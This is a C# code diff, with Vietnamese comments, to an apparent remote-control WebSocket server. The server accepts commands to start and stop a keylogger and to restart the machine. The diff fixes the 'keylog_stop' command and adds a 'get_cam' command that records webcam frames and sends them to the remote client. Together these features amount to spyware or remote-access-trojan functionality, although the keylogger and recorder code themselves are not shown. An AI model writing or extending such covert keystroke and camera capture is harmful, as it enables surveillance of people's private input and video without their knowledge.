@@ -6,6 +6,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Linq;
+using System.Text.Json;
 
 namespace WebSocketTest
 {
@@ -122,7 +123,7 @@ namespace WebSocketTest
                         KeyLoggerService.Start();
                         return JsonSuccess("Đã bắt đầu ghi phím (Keylogger Started).");
 
-                    case "keylog_sthatop":
+                    case "keylog_stop":
                         KeyLoggerService.Stop();
                         return JsonSuccess("Đã dừng ghi phím.");
 
@@ -142,6 +143,42 @@ namespace WebSocketTest
                     case "restart":
                         ShutdownRestart.Restart();
                         return JsonSuccess("Lệnh khởi động lại đã được gửi.");   
+                    case "get_cam":
+                        // Chạy bất đồng bộ để không treo server (timeout 8 giây)
+                        _ = Task.Run(async () => 
+                        {
+                            try
+                            {
+                                await SendToClient(JsonInfo("Đang quay video (5s)..."));
+
+                                // Gọi hàm mới lấy danh sách frame (timeout 7s)
+                                var frames = WebcamRecorder.RecordFrames(7000);
+
+                                if (frames == null || frames.Count == 0)
+                                {
+                                    await SendToClient(JsonError("Lỗi: Không thể mở Webcam hoặc không ghi được frame nào."));
+                                }
+                                else
+                                {
+                                    // Dùng JsonSerializer để escape JSON đúng cách (an toàn hơn)
+                                    var response = new
+                                    {
+                                        type = "video_stream",
+                                        data = frames
+                                    };
+                                    string jsonResponse = JsonSerializer.Serialize(response);
+
+                                    // Gửi cục dữ liệu về client
+                                    await SendToClient(jsonResponse);
+                                    _logger($"Video được gửi ({frames.Count} frames).");
+                                }
+                            }
+                            catch (Exception ex)
+                            {
+                                await SendToClient(JsonError($"Lỗi camera: {ex.Message}"));
+                            }
+                        });
+                    return JsonInfo("Đang khởi động Camera...");
                 }
             }
             catch (Exception ex) { return JsonError("Lỗi Server: " + ex.Message); }
